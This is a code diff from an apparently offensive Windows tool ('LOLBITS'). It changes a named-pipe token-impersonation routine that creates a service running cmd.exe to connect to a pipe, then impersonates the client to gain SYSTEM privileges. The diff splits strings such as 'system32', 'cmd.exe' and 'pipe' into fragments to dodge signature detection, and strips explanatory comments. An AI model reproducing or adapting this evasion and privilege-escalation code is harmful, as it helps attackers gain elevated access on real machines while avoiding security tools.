@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO.Pipes;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 
 namespace LOLBITS.TokenManagement
@@ -120,7 +121,7 @@ namespace LOLBITS.TokenManagement
             var exit = false;
             var server = new Thread(ServerThread);
 
-            var cmd = "sc create " + service + " binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
+            var cmd = "sc create " + service + " binpath= \"c:\\windows\\sys" + "tem32\\cm" + "d.exe /C " + "echo data > \\\\.\\pi" + "pe\\" + _pipeName + "\"";
             Utils.ExecuteCommand(cmd, sysCall);
 
             server.Start();
@@ -157,14 +158,10 @@ namespace LOLBITS.TokenManagement
             var pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, _numThreads);
             var threadId = Thread.CurrentThread.ManagedThreadId;
 
-            // Wait for a client to connect
             pipeServer.WaitForConnection();
 
             try
             {
-                // Read the request from the client. Once the client has
-                // written to the pipe its security token will be available.
-
                 var ss = new StreamString(pipeServer);
 
                 var filename = ss.ReadString();
@@ -172,8 +169,6 @@ namespace LOLBITS.TokenManagement
 
                 pipeServer.RunAsClient(Utils.Start);
 
-                // Catch the IOException that is raised if the pipe is broken
-                // or disconnected.
             }
             catch
             {
